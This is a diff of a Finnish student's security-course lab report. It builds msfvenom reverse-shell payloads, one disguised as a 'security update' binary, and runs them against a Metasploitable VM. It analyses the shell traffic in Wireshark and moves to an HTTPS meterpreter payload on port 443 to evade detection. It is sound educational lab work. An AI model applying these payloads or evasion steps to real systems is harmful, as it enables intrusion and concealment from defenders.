@@ -19,7 +19,7 @@ msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.56.101 LPORT=8080 -f elf >
 
 Jotta voisin saada tämän payloadin kohdekoneelle, päätin käyttää samaa tekniikkaa mitä esimerkkivideossa (CyberOffense, 17.4.2022) käytettiin.
 
-    Ensin loin uuden kansion johon siirsin binäärin.
+Ensin loin uuden kansion johon siirsin binäärin.
 ```
 mkdir security_updates
 mv very_important_security_update.elf security_updates
@@ -114,6 +114,86 @@ Lopulta kun kokeilin stageless payloadia niin sain reverse shellin avattua. En t
 
 ## b) Snif venom! Tarkastele ja analysoi msfvenomin muodostamaa reverse shell -yhteyttä. Käytä snifferiä, kuten Wireshark. Mitä havaitset? Mistä ominaisuuksista yhteyden voi tunnistaa? Millä muutoksilla tunnistamista voi vaikeuttaa?
 
+### Snif
+
+Aloitin tekemällä tcpdumpin.
+```
+sudo tcpdump -i eth1 -w capture.pcap
+```
+- `-i eth1` Kuuntele interface eth1:tä.
+- `-w capture.pcap` Älä tulosta paketteja reaaliajassa vaan tallenna (write) ne tiedostoon capture.pcap
+
+Sitten avasin uuden yhteyden multi/handleriin. Annoin muutaman komennon ja lopetin tcpdumpin.
+
+![](h6/tcpdump.png)
+
+Avasin tcpdumpin kirjoittaman tiedoston wiresharkilla.
+
+```
+wireshark capture.pcap
+```
+
+Kolmesta ensimmäisestä rivistä nähdään, että metasploitable on aloittanut kolmiosaisen kättelyn. Tämä on ensimmäinen asia johon kannattaa kiinnittää huomio jos kyseessä on palvelin johon on murtauduttu. Yleensä palvelin ei ole se joka tekee aloitteita.
+
+![](h6/wireshark.png)
+
+Wiresharkissa on hyödyllinen ominaisuus Follow TCP stream. Tämän saa käyttöön klikkaamalla hiiren vasemmalla ensimmäisestä paketista, ja valitsee follow -> TCP stream. Koska TCP -liikenne ei ole salattua, näemme liikenteen ja annetut komennot plaintextinä.
+
+![](h6/follow_tcp.png)
+
+Täällä näemme, että kali on lähettänyt echo stringin metasploitablelle (tämä oli ensimmäinen lähetetty paketti kättelyn jälkeen no. 11). Tämän jälkeen metasploitable on vastannut samalla stringillä. En löytänyt tähän mitään yksiselitteistä selitystä, mutta ChatGPT epäili että kyseessä on mekanismi, jolla metasploit tarkistaa että yhteys toimii.
+
+Luulin, että shell oli taustalla, joten yritin avata sen. Väärä komento lähetettiin metasploitablelle, josta tuli vastaus että komentoa ei löydy.
+
+Tämän jälkeen näkyy antamani whoami ja ip a -komennot sekä niiden vastaukset. Tämä on luonnollisesti iso punainen lippu. Jos kaapatuista paketeista näkyy, että joku kyselee TCP-yhteyden yli käyttäjätietojen perään tai yrittää selvitellä käytössä olevia interfaceja, kannattaa pikkuhiljaa huolestua.
+
+### Salaus
+
+Helpoin tapa vaikeuttaa tunnistamista on todennäköisesti yhteyden salaaminen. Ja tämä onnistuu varmaan helpoiten käyttämällä https-protokollaa.
+
+msfvenomista löytyy yksi x86 arkkitehtuurin https payload.
+
+![](h6/grep_https.png)
+
+Loin uuden payloadin käyttämällä tätä. Lportiksi laitoin 443.
+
+![](h6/https_payload.png)
+
+Avasin palomuuriin portin 443 ja suljin 4444.
+```
+sudo ufw allow 443/tcp
+sudo ufw deny 4444/tcp
+```
+
+Sitten siirsin tiedoston kohdekoneelle samaa tekniikkaa käyttäen kuin aikaisemmin ja annoin execute oikeudet.
+
+![](h6/download_https.png)
+
+Sitten kokeillaan toimiiko tämä suoraan multi/handlerin kanssa. Asetin kuuntelevaksi portiksi taas 443, laitoin tcpdumpin päälle ja käynnistin exploitin kohdekoneelta.
+
+Tämä ei onnistunut. Näin liikennettä wiresharkissa ja metasploitable yritti selvästi avata yhteyttä, mutta shell-sessio ei avautunut.
+
+Tässä kohtaa huomasin että payloadin tyyppiä voi vaihtaa multi/handlerissa, joten vaihdoin sen tuohon samaan, jonka olin valinnut msfvenomissa.
+
+![](h6/change_payload_type.png)
+
+Sitten kokeilin ajaa haittaohjelmaa uudestaan.
+
+Nyt sain meterpreter session auki. Ehkä payload optionsin vaihtaminen olisi ollut ratkaisu edellisen tehtävän haasteisiin, harmi etten ollut silloin vielä huomannut sitä.
+
+![](h6/https_success.png)
+
+Nyt huomaamme, että tcpdumpin sisältö ei sisällä enää pelkkiä tcp-paketteja, vaan mukana on myös TLS-protokollaa. Siellä on mm. tarkistettu sertifikaatteja ja vaihdeltu kryptausavaimia.
+
+![](h6/wireshark_https.png)
+
+Lisäksi jos valitsemme taas follow tcp stream, niin näemme, että aikaisemmin selkokielisenä näkyneet syötteet ovat nyt kryptattu.
+
+![](h6/https_follow_tcp.png)
+
+Kyllähän tästä edelleen huomaa että jotain hämärää on tekeillä, mutta ainakin yhteyden salaus mahdollistaa sen, että tutkija ei suoraan tästä näe mitä hyökkääjä on tehnyt.
+
+## c) Hello, Sliver. Näytä esimerkki http-yhteydestä Sliverillä.
 
 
 ## Lähteet
